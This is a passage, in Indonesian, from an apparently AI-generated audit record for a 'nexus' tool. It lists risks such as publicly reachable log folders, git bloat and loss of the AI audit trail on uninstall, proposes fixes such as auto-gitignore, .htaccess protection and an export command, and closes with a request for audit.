1.  **Security Leak (Logs)**: Folder `nexus/logs/` berisi detail aktivitas teknis. Jika project di-deploy ke server publik tanpa proteksi direktori (seperti di Apache/Nginx), log ini bisa diakses via URL.
2.  **Git Bloat**: Ribuan file prompt dan log yang tidak ter-ignore bisa masuk ke repositori, merusak estetika dan kecepatan `git push/pull`.
3.  **Irreversible Audit Loss**: Uninstalasi menghapus satu-satunya bukti audit AI. Tidak ada mekanisme "soft delete" atau backup otomatis ke luar folder project.
4.  **Inconsistency**: Jika `nexus install` dilakukan berkali-kali tanpa `--force`, struktur dokumentasi bisa menjadi tidak sinkron antara versi lokal dan versi engine.

---

## 4. 💡 Rekomendasi Perbaikan (Future Fix)

- [ ] **Global Storage**: Pertimbangkan memindahkan folder `memory/` dan `logs/` ke direktori global user (misal: `~/.nexus/memory`) daripada di dalam root project.
- [ ] **Auto-Gitignore**: Tambahkan fitur otomatis untuk mengupdate `.gitignore` project target saat proses instalasi.
- [ ] **Access Protection**: Otomatis buat file `.htaccess` atau file konfigurasi server di dalam folder `nexus/` untuk menolak akses publik.
- [ ] **Audit Backup**: Implementasikan perintah `nexus export` untuk membackup dokumentasi penting sebelum uninstalasi dilakukan.

---

**STATUS: SELESAI DIEKSEKUSI**
**ACTION: Mohon dilakukan Audit terhadap Record ini.**


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [vcs]

